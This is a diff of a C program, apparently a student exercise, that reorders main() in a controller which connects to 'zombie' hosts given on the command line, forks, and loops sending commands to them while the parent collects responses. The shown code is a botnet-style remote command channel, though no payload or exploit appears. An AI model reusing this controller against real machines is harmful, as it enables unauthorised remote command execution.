@@ -4,36 +4,12 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <unistd.h>
+#include <poll.h>
 
-#include "network.h"
 #include "utils_v2.h"
+#include "network.h"
 
-int main(int argc, char const *argv[])
-{
-    nbrSockFD = 0;
-    for (size_t i = 1; i < argc; i++)
-    {
-        testAndConnectPorts(argv[i]);
-    }
-
-    pid_t pid;
-
-    pid = fork();
-    if (pid == 0)
-    {
-        // FILS
-        sendCommandToZombies();
-    }
-    else
-    {
-        // PERE
-        listenToResponse();
-    }
-
-    return 0;
-}
-
-bool sendCommandToZombies()
+void sendCommandToZombies()
 {
     while (1)
     {
@@ -45,7 +21,6 @@ bool sendCommandToZombies()
             swrite(sockFdPortsConnectedTab[i], command, sizeof(command));
         }
     }
-    return true;
 }
 
 char *listenToResponse()
@@ -75,4 +50,31 @@ char *listenToResponse()
             }
         }
     }
+}
+
+int main(int argc, char const *argv[])
+{
+    nbrSockFD = 0;
+    for (size_t i = 1; i < argc; i++)
+    {
+        const char* ip = argv[i];
+        testAndConnectPorts(ip);
+    }
+
+    pid_t pid;
+
+    pid = fork();
+    if (pid == 0)
+    {
+        // FILS
+        sendCommandToZombies();
+    }
+    else
+    {
+        // PERE
+        listenToResponse();
+    }
+
+    free(sockFdPortsConnectedTab);
+    return 0;
 }
